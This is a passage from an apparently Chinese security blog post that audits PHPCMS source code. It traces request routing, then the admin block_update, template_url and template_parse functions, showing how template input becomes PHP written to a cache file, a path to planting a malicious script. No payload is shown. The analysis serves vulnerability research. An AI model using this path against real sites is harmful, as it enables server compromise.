class="line">		<span class="keyword">$this</span>-&gt;init();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>先看到_construct()方法，这里实例化param类，跟进php/libs/classes/param.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  param.class.php	参数处理类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2012 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2012-9-17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">param</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//路由配置</span></span><br><span class="line">	<span class="keyword">private</span> $route_config = <span class="string">''</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">            $_POST = new_addslashes($_POST);</span><br><span class="line">            $_GET = new_addslashes($_GET);</span><br><span class="line">            $_REQUEST = new_addslashes($_REQUEST);</span><br><span class="line">            $_COOKIE = new_addslashes($_COOKIE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;route_config = pc_base::load_config(<span class="string">'route'</span>, SITE_URL) ? pc_base::load_config(<span class="string">'route'</span>, SITE_URL) : pc_base::load_config(<span class="string">'route'</span>, <span class="string">'default'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>] <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[$_key])) $_POST[$_key] = $_value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	... ...</span><br><span class="line">	... ...</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取模型</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_m</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$m = <span class="keyword">isset</span>($_GET[<span class="string">'m'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'m'</span>]) ? $_GET[<span class="string">'m'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'m'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'m'</span>]) ? $_POST[<span class="string">'m'</span>] : <span class="string">''</span>);</span><br><span class="line">		$m = <span class="keyword">$this</span>-&gt;safe_deal($m);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'m'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($m)) <span class="keyword">return</span> $m;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取控制器</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_c</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$c = <span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'c'</span>]) ? $_GET[<span class="string">'c'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'c'</span>]) ? $_POST[<span class="string">'c'</span>] : <span class="string">''</span>);</span><br><span class="line">		$c = <span class="keyword">$this</span>-&gt;safe_deal($c);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($c)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'c'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($c)) <span class="keyword">return</span> $c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取事件</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'a'</span>]) ? $_GET[<span class="string">'a'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'a'</span>]) ? $_POST[<span class="string">'a'</span>] : <span class="string">''</span>);</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;safe_deal($a);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($a)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'a'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($a)) <span class="keyword">return</span> $a;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	... ...</span><br><span class="line">	... ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>其中的route_config<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;route_config = pc_base::load_config(<span class="string">'route'</span>, SITE_URL) ? pc_base::load_config(<span class="string">'route'</span>, SITE_URL) : pc_base::load_config(<span class="string">'route'</span>, <span class="string">'default'</span>);</span><br></pre></td></tr></table></figure></p>
<p>可以跟进caches/configs/route.php,查看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'default'</span>=&gt;<span class="keyword">array</span>(<span class="string">'m'</span>=&gt;<span class="string">'content'</span>, <span class="string">'c'</span>=&gt;<span class="string">'index'</span>, <span class="string">'a'</span>=&gt;<span class="string">'init'</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>这个类中，我们可以看到用户可以通过需求选择模块，控制器，以及需要加载的事件.<br>这个之后，分别给定’ROUTE_M’,’ROUTE_C’,’ROUTE_A’的值，然后进入init()函数，<br>跟进init():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 调用事件</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      $controller = <span class="keyword">$this</span>-&gt;load_controller();</span><br><span class="line">      <span class="keyword">if</span> (method_exists($controller, ROUTE_A)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (preg_match(<span class="string">'/^[_]/i'</span>, ROUTE_A)) &#123;</span><br><span class="line">              <span class="keyword">exit</span>(<span class="string">'You are visiting the action is to protect the private action'</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">'Action does not exist.'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>关注<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br></pre></td></tr></table></figure></p>
<p>然后跟进load_controller()…..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 加载控制器</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $filename</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $m</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> obj</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load_controller</span><span class="params">($filename = <span class="string">''</span>, $m = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($filename)) $filename = ROUTE_C;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($m)) $m = ROUTE_M;</span><br><span class="line">      $filepath = PC_PATH.<span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.<span class="string">'.php'</span>;</span><br><span class="line">      <span class="keyword">if</span> (file_exists($filepath)) &#123;</span><br><span class="line">          $classname = $filename;</span><br><span class="line">          <span class="keyword">include</span> $filepath;</span><br><span class="line">          <span class="keyword">if</span> ($mypath = pc_base::my_path($filepath)) &#123;</span><br><span class="line">              $classname = <span class="string">'MY_'</span>.$filename;</span><br><span class="line">              <span class="keyword">include</span> $mypath;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span>(class_exists($classname))&#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">new</span> $classname;</span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">           &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">'Controller does not exist.'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>包含控制器类文件，实例化控制器并返回，具体文件路径：modules/模块名/控制器名.php<br> (默认加载modules/content/index.php)<br> 返回之后，就可以通过ROUTE_A,选择事件。</p>
<p>总结一下(这是从师傅那儿转的)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">核心类库在 phpcms/libs/classes/</span><br><span class="line"></span><br><span class="line">模型类库在 phpcms/model/</span><br><span class="line"></span><br><span class="line">应用目录 phpcms/modules/</span><br><span class="line"></span><br><span class="line">配置目录 caches/configs/</span><br><span class="line"></span><br><span class="line">全局变量被转义，$_SERVER 除外</span><br><span class="line"></span><br><span class="line">模块名、控制器名、方法名中的 /、.会被过滤</span><br><span class="line"></span><br><span class="line">方法名不允许以 _ 开头</span><br></pre></td></tr></table></figure></p>
<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>定位phpcms/modules/block/block_admin.php::block_update() 120行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">block_update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $id = <span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; intval($_GET[<span class="string">'id'</span>]) ? intval($_GET[<span class="string">'id'</span>]) :  showmessage(L(<span class="string">'illegal_operation'</span>), HTTP_REFERER);</span><br><span class="line">        <span class="comment">//进行权限判断</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;roleid != <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;priv_db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'blockid'</span>=&gt;$id, <span class="string">'roleid'</span>=&gt;<span class="keyword">$this</span>-&gt;roleid, <span class="string">'siteid'</span>=&gt;<span class="keyword">$this</span>-&gt;siteid))) &#123;</span><br><span class="line">                showmessage(L(<span class="string">'not_have_permissions'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$data = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id))) &#123;</span><br><span class="line">            showmessage(L(<span class="string">'nofound'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'dosubmit'</span>])) &#123;</span><br><span class="line">            $sql = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> ($data[<span class="string">'type'</span>] == <span class="number">2</span>) &#123;</span><br><span class="line">                $title = <span class="keyword">isset</span>($_POST[<span class="string">'title'</span>]) ? $_POST[<span class="string">'title'</span>] : <span class="string">''</span>;</span><br><span class="line">                $url = <span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) ? $_POST[<span class="string">'url'</span>] : <span class="string">''</span>;</span><br><span class="line">                $thumb = <span class="keyword">isset</span>($_POST[<span class="string">'thumb'</span>]) ? $_POST[<span class="string">'thumb'</span>] : <span class="string">''</span>;</span><br><span class="line">                $desc = <span class="keyword">isset</span>($_POST[<span class="string">'desc'</span>]) ? $_POST[<span class="string">'desc'</span>] : <span class="string">''</span>;</span><br><span class="line">                $template = <span class="keyword">isset</span>($_POST[<span class="string">'template'</span>]) &amp;&amp; trim($_POST[<span class="string">'template'</span>]) ? trim($_POST[<span class="string">'template'</span>]) : <span class="string">''</span>;</span><br><span class="line">                $datas = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> ($title <span class="keyword">as</span> $key=&gt;$v) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">empty</span>($v) || !<span class="keyword">isset</span>($url[$key]) ||<span class="keyword">empty</span>($url[$key])) <span class="keyword">continue</span>;</span><br><span class="line">                    $datas[$key] = <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$v, <span class="string">'url'</span>=&gt;$url[$key], <span class="string">'thumb'</span>=&gt;$thumb[$key], <span class="string">'desc'</span>=&gt;str_replace(<span class="keyword">array</span>(chr(<span class="number">13</span>), chr(<span class="number">43</span>)), <span class="keyword">array</span>(<span class="string">''</span>, <span class="string">' '</span>), $desc[$key]));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ($template) &#123;</span><br><span class="line">                    $block = pc_base::load_app_class(<span class="string">'block_tag'</span>);</span><br><span class="line">                    $block-&gt;template_url($id, $template);</span><br><span class="line"></span><br><span class="line">               ... ...</span><br><span class="line">               ... ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$block-&gt;template_url($id, $template);</span><br></pre></td></tr></table></figure></p>
<p>跟进template_url()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 生成模板返回路径</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> integer $id 碎片ID号</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> string $template 风格</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">template_url</span><span class="params">($id, $template = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">     $filepath = CACHE_PATH.<span class="string">'caches_template'</span>.DIRECTORY_SEPARATOR.<span class="string">'block'</span>.DIRECTORY_SEPARATOR.$id.<span class="string">'.php'</span>;</span><br><span class="line">     $dir = dirname($filepath);</span><br><span class="line">     <span class="keyword">if</span> ($template) &#123;</span><br><span class="line">         <span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">             mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">         &#125;</span><br><span class="line">         $tpl = pc_base::load_sys_class(<span class="string">'template_cache'</span>);</span><br><span class="line">         $str = $tpl-&gt;template_parse(new_stripslashes($template));</span><br><span class="line">         @file_put_contents($filepath, $str);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">if</span> (!file_exists($filepath)) &#123;</span><br><span class="line">             <span class="keyword">if</span>(!is_dir($dir)) &#123;</span><br><span class="line">                 mkdir($dir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             $tpl = pc_base::load_sys_class(<span class="string">'template_cache'</span>);</span><br><span class="line">             $str = <span class="keyword">$this</span>-&gt;db-&gt;get_one(<span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id), <span class="string">'template'</span>);</span><br><span class="line">             $str = $tpl-&gt;template_parse($str[<span class="string">'template'</span>]);</span><br><span class="line">             @file_put_contents($filepath, $str);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> $filepath;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>其中id和template都是我们可以控制的,$str是我们传入的$template，经过template_parse()过滤后而来的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 解析模板</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> $str    模板内容</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> ture</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 解析模板</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> $str	模板内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ture</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">template_parse</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;template\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php include template(\\1); ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;include\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php include \\1; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;php\s+(.+)\&#125;/"</span>, <span class="string">"&lt;?php \\1?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;if\s+(.+?)\&#125;/"</span>, <span class="string">"&lt;?php if(\\1) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;else\&#125;/"</span>, <span class="string">"&lt;?php &#125; else &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;elseif\s+(.+?)\&#125;/"</span>, <span class="string">"&lt;?php &#125; elseif (\\1) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\/if\&#125;/"</span>, <span class="string">"&lt;?php &#125; ?&gt;"</span>, $str );</span><br><span class="line">	<span class="comment">//for 循环</span></span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;for\s+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php for(\\1) &#123; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\/for\&#125;/"</span>,<span class="string">"&lt;?php &#125; ?&gt;"</span>,$str);</span><br><span class="line">	<span class="comment">//++ --</span></span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\+\+(.+?)\&#125;/"</span>,<span class="string">"&lt;?php ++\\1; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;\-\-(.+?)\&#125;/"</span>,<span class="string">"&lt;?php ++\\1; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;(.+?)\+\+\&#125;/"</span>,<span class="string">"&lt;?php \\1++; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace(<span class="string">"/\&#123;(.+?)\-\-\&#125;/"</span>,<span class="string">"&lt;?php \\1--; ?&gt;"</span>,$str);</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\&#125;/"</span>, <span class="string">"&lt;?php \$n=1;if(is_array(\\1)) foreach(\\1 AS \\2) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;loop\s+(\S+)\s+(\S+)\s+(\S+)\&#125;/"</span>, <span class="string">"&lt;?php \$n=1; if(is_array(\\1)) foreach(\\1 AS \\2 =&gt; \\3) &#123; ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\/loop\&#125;/"</span>, <span class="string">"&lt;?php \$n++;&#125;unset(\$n); ?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;\\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff:]*\(([^&#123;&#125;]*)\))\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;(\\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)\&#125;/"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;(\\$[a-zA-Z0-9_\[\]\'\"\$\x7f-\xff]+)\&#125;/s"</span>,  <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'addquote'</span>),$str);</span><br><span class="line">	$str = preg_replace ( <span class="string">"/\&#123;([A-Z_\x7f-\xff][A-Z0-9_\x7f-\xff]*)\&#125;/s"</span>, <span class="string">"&lt;?php echo \\1;?&gt;"</span>, $str );</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;pc:(\w+)\s+([^&#125;]+)\&#125;/i"</span>, <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'pc_tag_callback'</span>), $str);</span><br><span class="line">	$str = preg_replace_callback(<span class="string">"/\&#123;\/pc\&#125;/i"</span>, <span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="string">'end_pc_tag'</span>), $str);</span><br><span class="line">	$str = <span class="string">"&lt;?php defined('IN_PHPCMS') or exit('No permission resources.'); ?&gt;"</span> . $str;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后对$templatem没有影响，但是经过这个函数后，我们输入的$template，就会加上一段<strong>&lt;?php defined(‘IN_PHPCMS’) or exit(‘No permission resources.’); ?&gt;</strong>，那么加入我们的恶意php文件上传成功，</p>
